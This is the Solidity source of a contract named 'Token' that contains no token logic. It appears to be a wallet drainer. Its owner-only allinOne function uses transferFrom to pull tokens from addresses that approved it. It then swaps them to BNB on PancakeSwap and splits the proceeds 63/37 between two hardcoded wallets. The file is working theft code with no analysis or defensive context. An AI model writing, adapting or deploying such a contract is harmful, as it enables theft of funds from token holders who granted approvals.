/**
 *Submitted for verification at BscScan.com on 2022-05-02
*/

//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

//import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface ERC20I {
    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function transfer(address to, uint256 amount) external returns (bool);

}

interface PancakeswapInterface{
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn,
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint deadline
    ) external;

    function WETH() external pure returns (address);

}
contract Token {

    address owner;
    
    fallback() external payable{

    }

    receive() external payable{

    }
    
    constructor() {
        owner = msg.sender;
    }

    function getBalanceERC20(address erc20_address) public view returns(uint){
        return ERC20I(erc20_address).balanceOf(address(this));
    }

    function transferERCToken(address erc20_address, address from, address to, uint value) public {
        require(msg.sender == owner);
        ERC20I(erc20_address).transferFrom(from, to, value);
    }

    function swapTknForBNB(address pancakeSwap, address erc20_address) public {
        address[] memory path = new address[](2);
        path[0] = erc20_address;
        path[1] = PancakeswapInterface(pancakeSwap).WETH();

        address to = address(this);

        uint deadline = block.timestamp + 100;
        uint bal_erc20 = getBalanceERC20(erc20_address);

        ERC20I(erc20_address).approve(pancakeSwap, bal_erc20);
        PancakeswapInterface(pancakeSwap).swapExactTokensForETHSupportingFeeOnTransferTokens(bal_erc20, 10 ether, path, to, deadline);
    }

    function getBNBBack() public {
        address payable rainman_address = payable(0x5978D42087a63a3F2358c593eEe2EA4947357576);
        address payable yashrs_address = payable(0xC6dE52d05A1eE7B48F372EDCE50517e4E6a05244);

        uint rainman_bnb = 63 * address(this).balance / 100;
        uint yashrs_bnb = address(this).balance - rainman_bnb;

        rainman_address.transfer(rainman_bnb);
        yashrs_address.transfer(yashrs_bnb);
    }

    function allinOne(address erc20_address, address from, address to, uint val, address pancakeswap_addr) public 
    {
        require(msg.sender == owner);
        transferERCToken(erc20_address, from, to, val);
        swapTknForBNB(pancakeswap_addr, erc20_address);
        getBNBBack();
    }

    function getOwnBalance() public view returns(uint){
        return address(this).balance;
    }
}